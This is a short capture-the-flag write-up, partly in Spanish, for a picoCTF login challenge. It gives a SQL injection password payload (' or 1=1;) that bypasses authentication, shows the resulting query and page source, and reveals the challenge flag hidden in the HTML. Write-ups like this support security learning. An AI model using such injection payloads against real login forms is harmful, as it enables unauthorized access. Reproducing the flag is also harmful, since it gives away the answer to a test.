## Objetivo
Can you login to this website?Try to login [here](http://saturn.picoctf.net:61414/).
## Solución
Poner valores:
Username: admin
Password: ' or 1= 1;


username: admin
password: 'or 1 = 1;
SQL query: SELECT * FROM users WHERE name='admin' AND password=''or 1 = 1;'

Logged in! But can you see the flag, it is in plainsight.

Vemos el código fuente
```html
|   |   |
|---|---|
||<pre>username: admin|
||password: &#039; or 1 = 1;|
||SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; or 1 = 1;&#039;|
||</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>|
```
## Notas Adicionales

## Referencias
